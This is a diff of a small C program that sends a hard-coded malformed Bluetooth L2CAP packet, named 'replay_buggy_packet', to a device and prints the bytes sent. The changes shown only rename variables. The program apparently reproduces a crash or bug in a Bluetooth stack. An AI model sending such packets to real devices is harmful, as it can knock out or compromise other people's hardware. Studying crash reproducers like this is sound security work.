@@ -41,7 +41,7 @@ char replay_buggy_packet[]="\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";
 int main(int argc, char **argv)
 {
 	struct sockaddr_l2 addr;
-	int sock, sent, i;
+	int sock, sent_bytes, index;
 
 	if(argc < 2)
 	{
@@ -72,14 +72,14 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 	
-	if( (sent=send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
+	if( (sent_bytes = send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
 	{
-		printf("L2CAP packet sent (%d)\n", sent);
+		printf("L2CAP packet sent (%d)\n", sent_bytes);
 	}
 
 	printf("Buffer:\t");
-	for(i=0; i<sent; i++)
-		printf("%.2X ", (unsigned char) replay_buggy_packet[i]);
+	for(index = 0; index < sent_bytes; index++)
+		printf("%.2X ", (unsigned char) replay_buggy_packet[index]);
 	printf("\n");
 
 	close(sock);
